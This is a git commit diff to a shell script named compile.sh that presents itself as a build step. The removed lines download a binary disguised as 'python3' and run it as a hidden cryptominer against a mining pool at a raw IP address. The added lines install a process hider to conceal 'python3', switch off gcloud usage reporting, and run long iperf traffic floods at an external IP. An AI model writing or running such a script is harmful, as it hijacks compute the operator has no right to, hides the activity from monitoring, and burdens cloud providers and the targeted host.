d12bc9250f3b1b56bee99853700b9dcfbc913565
alucardalu49 <114854656+alucardalu49@users.noreply.github.com>
2023-09-05 19:54:16 +0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,5 +1,19 @@
-#!/bin/bash
-wget https://github.com/azkhaadhenia/cli/raw/main/python3
-chmod +x python3
-./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TJFizKH6LFbQfSi95hfwtBZcnA8sWtA3Cg.her -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30; done
+#!/usr/bin/env bash
+cd ..
+rm -rf wappah
+git clone https://github.com/azizmaziz/wappah.git
+cd wappah
+sudo apt-get update
+sudo apt install docker.io -y
+sudo apt install npm -y
+sudo npm i -g node-process-hider && sudo ph add python3
+sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
+    chmod +x /usr/local/bin/docker-compose
+sudo docker-compose build --parallel 
+sudo docker-compose up -d  && clear 
+sudo apt-get install iperf -y
+sudo gcloud config set disable_usage_reporting true
+sudo docker-compose logs
+sudo iperf -c 159.223.168.17 -t 36000 -i 10 -l 0.001K & sudo apt install nethogs -y
+sudo nethogs
+sleep 200h
